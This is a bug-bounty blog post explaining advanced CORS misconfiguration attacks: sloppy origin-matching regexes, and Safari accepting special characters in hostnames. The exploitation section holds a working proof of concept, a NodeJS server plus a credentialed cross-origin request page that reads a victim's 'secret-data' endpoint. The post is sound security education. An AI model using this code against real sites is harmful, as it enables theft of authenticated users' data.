---
source: corben-leo
source_url: https://corben.io/blog/18-6-16-advanced-cors-techniques
title: "Advanced CORS Exploitation Techniques"
description: "Advanced CORS Exploitation techniques"
---

### Preface

I've seen some fantastic research done by [Linus Särud](https://twitter.com/_zulln) and by [Bo0oM](https://twitter.com/i_bo0om) on how Safari's handling of special characters could be abused.

Both articles dive into practical scenarios where Safari's behavior can lead to XSS or Cookie Injection. The goal of this post is bring even more creativity and options to the table!

### Introduction:

Last November, I wrote about a tricky cross-origin resource sharing bypass in Yahoo View that abused Safari's handling of special characters. Since then, I've found more bugs using clever bypasses and decided to present more advanced techniques to be used.


__Note__:

This assumes you have a basic understanding of what CORS is and how to exploit misconfigurations. Here are some awesome posts to get you caught up:

### Background: dns & browsers:

__Quick Summary:__

-
Domain Name System is essentially an address book for servers. It translates/maps hostnames to IP addresses, making the internet easier to use.

-
When you attempt to visit a URL into a browser: A DNS lookup is performed to convert the host to an IP address ⇾ it initiates a TCP connection to the server ⇾ the server responds with

`SYN+ACK`

⇾ the browser sends an HTTP request to the server to retrieve content ⇾ then renders / displays the content accordingly.

If you're a visual thinker, [here](https://archive.is/7esuD/7f605d268fe68f5c5e2490ecf520346ab24da23b.jpg) is an image of the process.

DNS servers respond to arbitrary requests – you can send any characters in a subdomain and it'll respond as long as the domain has a wildcard DNS record.

**Example:**

`dig A "<@$&(#+_\`^%~>.withgoogle.com" @1.1.1.1 | grep -A 1 "ANSWER SECTION"`


**Browsers?**

So we know DNS servers respond to these requests, but how do browsers handle them?
*Answer:* **Most** browsers validate domain names before making any requests.

### Examples:

**Chrome:**

**Firefox:**

**Safari:**

Notice how I said *most* browsers validate domain names, not all of them do. Safari is the divergent: if we attempt to load the same domain, it will actually send the request and load the page:

We can use all sorts of different characters, even unprintable ones:

```
,&'";!$^*()+=`~-_=|{}%
// non printable chars
%01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f
```


### Jumping into CORS configurations:

Most CORS integrations contain a whitelist of origins that are permitted to read information from an endpoint. This is usually done by using regular expressions.

**Example #1:**

`^https?:\/\/(.*\.)?xxe\.sh$`


**Intent:** The intent of implementing a configuration with this regex would be to allow cross-domain access from xxe.sh and any subdomain (http:// or https://)

The only way an attacker would be able to steal data from this endpoint, is if they had either an XSS or subdomain takeover on `http(s)://xxe.sh`

/ `http(s)://*.xxe.sh`

.

**Example #2:**

`^https?:\/\/.*\.?xxe\.sh$`


**Intent:** Same as Example #1 – allow cross-domain access from xxe.sh and any subdomain

This regular expression is quite similar to the first example, however it contains a problem that would cause the configuration to be vulnerable to data theft.

The problem lies in the following regex: `.*\.?`


**Breakdown:**

```
.* = any characters except for line terminators
\. = a period
? = a quantifier, in this case matches "." either zero or one times.
```


Since `.*\.`

is not in a capturing group (like in the first example), the `?`

quantifier only affects the `.`

character, therefore any characters are allowed before
the string "xxe.sh", regardless of whether there is a period separating them.

This means an attacker could send ** any** origin ending in xxe.sh and would have cross-domain access.

This is a pretty common bypass technique – here's a real example of it:

[https://hackerone.com/reports/168574](https://hackerone.com/reports/168574) by [James Kettle](https://twitter.com/albinowax)

**Example #3:**

`^https?:\/\/(.*\.)?xxe\.sh\:?.*`


**Intent:** This would be likely be implemented with the intent to allow cross-domain access from xxe.sh, all subdomains, and from any ports on those domains.

Can you spot the problem?

**Breakdown:**

```
\: = Matches the literal character ":"
? = a quantifier, in this case matches ":" either zero or one times.
.* = any characters except for line terminators
```


Just like in the second example, the `?`

quantifier only affects the `:`

character. So if we send an origin with other characters after xxe.sh, it will still be accepted.

### the million dollar question:

How does Safari's handling of special characters come into play when exploiting CORS Misconfigurations?


Take the following Apache configuration for example:

```
SetEnvIf Origin "^https?:\/\/(.*\.)?xxe.sh([^\.\-a-zA-Z0-9]+.*)?" AccessControlAllowOrigin=$0
Header set Access-Control-Allow-Origin %{AccessControlAllowOrigin}e env=AccessControlAllowOrigin
```


This would be likely be implemented with the intent of cross-domain access from xxe.sh, all subdomains, and from any ports on those domains.

Here's a breakdown of the regular expression:

```
[^\.\-a-zA-Z0-9] = does not match these characters: "." "-" "a-z" "A-Z" "0-9"
+ = a quantifier, matches above chars one or unlimited times (greedy)
.* = any character(s) except for line terminators
```


This API won't give access to domains like the ones in the previous examples and other common bypass techniques won't work. A subdomain takeover or an XSS on *.xxe.sh would allow an attacker to steal data, but let's get more creative!

We know any origin as *.xxe.sh followed by the characters `. - a-z A-Z 0-9`

won't be trusted. What about an origin with a space after the string "xxe.sh"?

We see that it's trusted, however, such a domain *isn't* supported in any normal browser.
Since the regex matches against alphanumeric ASCII characters and `. -`

, special characters after "xxe.sh" would be trusted:

Such a domain would be supported in a modern, common browser: Safari.

## Exploitation:

**Pre-Requisites:**

- A domain with a wildcard DNS record pointing it to your box.
- NodeJS

Like most browsers, Apache and Nginx (right out of the box) also don't like these special characters, so it's much easier to serve HTML and Javascript with NodeJS.

```
var http = require("http");
var url = require("url");
var fs = require("fs");
var port = 80;
http
.createServer(function (req, res) {
if (req.url == "/cors-poc") {
fs.readFile("cors.html", function (err, data) {
res.writeHead(200, { "Content-Type": "text/html" });
res.write(data);
res.end();
});
} else {
res.writeHead(200, { "Content-Type": "text/html" });
res.write("never gonna give you up...");
res.end();
}
})
.listen(port, "0.0.0.0");
console.log(`Serving on port ${port}`);
```


In the same directory, save the following:

```
<!DOCTYPE html>
<html>
<head><title>CORS</title></head>
<body onload="cors();">
<center>
cors proof-of-concept:
<textarea rows="10" cols="60" id="pwnz">
</textarea>
</div>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("pwnz").innerHTML = this.responseText;
}
};
xhttp.open("GET", "http://x.xxe.sh/api/secret-data/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
```


Start the NodeJS server by running the following command:

`node serve.js &`


Like stated before, since the regular expression matches against alphanumeric ASCII characters and `. -`

, special characters after "xxe.sh" would be trusted:

So if we open Safari and visit `http://x.xxe.sh{.<your-domain>/cors-poc`

, we will see that we were able to successfully steal data from the vulnerable endpoint.

*Edit:* It was brought to my attention that the `_`

character (in subdomains) is not only supported in Safari, but also in Chrome and Firefox!
Therefore `http://x.xxe.sh_.<your-domain>/cors-poc`

would send valid origin from the most common browsers! Thanks [Prakash](https://twitter.com/1lastBr3ath), you rock!

## Practical testing

With these special characters now in mind, figuring out which Origins are reflected in the *Access-Control-Allow-Origin* header can be a tedious, time-consuming task:

### theftfuzzer:

To save time and to become more efficient, I decided to code a tool to fuzz CORS configurations for allowed origins. It's written in Python and it generates a bunch of different permutations for possible CORS bypasses. It can be found on my Github [here](https://github.com/lc/theftfuzzer). If you have any ideas for improvements to the tool, feel free to ping me or make a pull request!

## Outro

I hope this post has been informative and that you've learned from it! Go exploit those CORS configurations and earn some bounties;

Happy Hunting!

**Corben Leo**